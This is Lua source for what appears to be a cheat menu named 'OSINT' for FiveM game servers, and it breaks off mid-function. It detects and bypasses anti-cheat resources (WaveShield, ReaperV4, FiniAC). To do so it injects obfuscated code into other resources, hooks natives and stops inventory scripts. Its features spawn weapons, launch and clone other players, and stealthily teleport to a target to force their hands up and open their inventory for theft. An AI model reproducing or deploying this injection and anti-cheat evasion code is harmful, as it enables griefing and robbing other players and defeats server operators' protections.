    local otherACs = {"WaveShield", "FiniAC"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("ReaperV4") == "started"
end

local function IsOnlyFiniActive()
    local otherACs = {"ReaperV4", "WaveShield"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("FiniAC") == "started"
end

function OSINT:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    local weaponBytes = encodeToByteArrayLiteral(weaponModel)
    local playerPed = PlayerPedId()
    if not playerPed or playerPed <= 0 then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    local WaveShit = GetResourceState("WaveShield") == 'started'

    if WaveShit then
        self:Notify("success", "OSINT", "Spawned Weapon via WaveShield Bypass V2", 3000)
    Injection(GetResourceState("ox_lib") == "started" and "ox_lib" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]], playerPed, weaponBytes))
    elseif GetResourceState("ReaperV4") == "started" then
        MachoResourceStop("ox_inventory")
        MachoResourceStop("ox_lib")
        self:Notify("success", "OSINT", "Spawned Weapon via ReaperV4 fallback", 3000)
        GiveWeaponToPed(playerPed, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(playerPed, weaponHash, true)
        Wait(250)
        MachoInjectResource("ReaperV4", [[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]] .. weaponHash .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]])
    elseif GetResourceState("FiniAC") == "started" then
        self:Notify("info", "OSINT", "Spawned Weapon Bypass #1", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]], weaponBytes)
        )
    else
        self:Notify("info", "OSINT", "Spawned Weapon Bypass #2", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]], weaponBytes)
        )
    end
end

function OSINT:GiveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]])
end

function OSINT:RemoveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]])
end

function OSINT:HandleLaunchPlayer(playerIds, radius)
    if not playerIds or #playerIds == 0 then
        return
    end

    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then
        return
    end

    radius = radius or 3000.0

    local function GetPlayersInRadius(targetCoords, radius)
        local playersInRadius = {}
        local myPed = PlayerPedId()
        if not myPed then
            return playersInRadius
        end

        for i = 0, 255 do
            local player = GetPlayerFromServerId(i)
            if player and player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                if coords then
                    local distance = #(targetCoords - coords)
                    if distance <= radius then
                        table.insert(playersInRadius, { player = player, serverId = i })
                    end
                end
            end
        end
        return playersInRadius
    end

    CreateThread(function()
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then
            return
        end

        local targetPed = GetPlayerPed(clientId)
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        local myPed = PlayerPedId()
        if not myPed then
            return
        end

        local myCoords = GetEntityCoords(myPed)
        local targetCoords = GetEntityCoords(targetPed)
        if not myCoords or not targetCoords then
            return
        end

        local distance = #(myCoords - targetCoords)
        local teleported = false
        local originalCoords = nil

        if distance > 10.0 then
            originalCoords = myCoords
            local angle = math.random() * 2 * math.pi
            local radiusOffset = math.random(5, 9)
            local xOffset = math.cos(angle) * radiusOffset
            local yOffset = math.sin(angle) * radiusOffset
            local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
            SetEntityVisible(myPed, false, 0)
            teleported = true
            Wait(100)
        end

        local playersInRadius = GetPlayersInRadius(targetCoords, radius)
        if #playersInRadius == 0 then
        end

        ClearPedTasksImmediately(myPed)
        for i = 1, 15 do
            if not DoesEntityExist(targetPed) then
                break
            end

            local curTargetCoords = GetEntityCoords(targetPed)
            if not curTargetCoords then
                break
            end

            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
            Wait(50)
            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
            Wait(50)
            DetachEntity(myPed, true, true)
            Wait(100)
        end

        Wait(500)
        ClearPedTasksImmediately(myPed)

        if originalCoords then
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
            Wait(100)
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
        end

        if teleported then
            SetEntityVisible(myPed, true, 0)
        end
    end)
end

function OSINT:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoInjectResourceRaw("any", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]], playerIdsStr))
end

function OSINT:HandleTakeInventory(playerIds)
    if not playerIds or #playerIds == 0 then return end
    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then return end

    print("Take Inventory action executed for players: " .. table.concat(playerIds, ", "))

    local WaveDihStarted = GetResourceState("WaveShield") == 'started'

    if WaveDihStarted then
    MachoInjectResourceRaw("ox_inventory", string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("OSINT Coroutine error:", err); break end
            _w(0)
        end
    ]], targetServerId))
    else
    MachoInjectResource2(NewThreadNs, "ox_inventory", string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]], targetServerId))
    end
end

function OSINT:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function OSINT:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function OSINT:RepairVehicle()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]])
end

local reaperActive = GetResourceState("ReaperV4") == "started"
local WaveActive = GetResourceState("WaveShield") == "started"
local qbJail = GetResourceState("qb-jail") == "started"

function OSINT:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Self",
            type = "subMenu",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        { type = "button", label = "Revive", desc = "This will attempt to revive you by script.",
                            onSelect = function()
                                local Actions = {
                                    ["amigo"] = function()
                                        Injection("amigo", [[ respawnPlayer() ]])
                                    end,

                                    ["TrappinBridge"] = function()
                                        Injection("new", [[ LocalPlayer.state:set('isDead', false, true) ]])
                                    end,

                                    ["rzrp-base"] = function()
                                    MachoInjectResource2(AsThreadNs, "rzrp-base", [[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]])
                                    end,
                                    
                                    ["FiveStar"] = function()
                                    MachoInjectResourceRaw("FiveStar", [[
                                    if not _G.OSINT then
                                            _G.OSINT = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.OSINT.TSEvent('revive:Player:Dead')
                                        end)
                                    ]])
                                    end,

                                    ["scripts"] = function()
                                        if GetResourceState("scripts") == 'started' then
                                            if WaveActive then
                                                TriggerEvent('deathscreen:revive')
                                            else
                                                if reaperActive then
                                                    MachoInjectThread(0, "scripts", "", [[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]])
                                                else
                                                    TriggerEvent('deathscreen:revive')
                                                end
                                            end
                                        end
                                    end,

                                    ["framework"] = function()
                                        if GetResourceState("framework") == 'started' then
                                            if WaveActive then
                                                TriggerEvent('deathscreen:revive')
                                            else
                                                if reaperActive then
                                                    MachoInjectThread(0, "framework", "", [[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]])
                                                else
                                                    TriggerEvent('deathscreen:revive')
                                                end
                                            end
                                        end
                                    end,

                                    ["qb-jail"] = function()
                                        if qbJail then
                                            if reaperActive then
                                                MachoInjectThread(0, "scripts", "", [[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]])
                                            else    
                                                TriggerEvent('hospital:client:Revive')
                                            end
                                        end
                                    end,

                                    ["wasabi_ambulance"] = function()
                                        print('2')
                                    local WaveShit = GetResourceState("WaveShield") == "started"
                                    local ReaperV4Shit = GetResourceState("ReaperV4") == "started"

                                    if WaveShit then
                                    MachoInjectResourceRaw("wasabi_ambulance", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])
                                    else
                                    if ReaperV4Shit then
                                    MachoInjectThread(0, "wasabi_ambulance", "", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
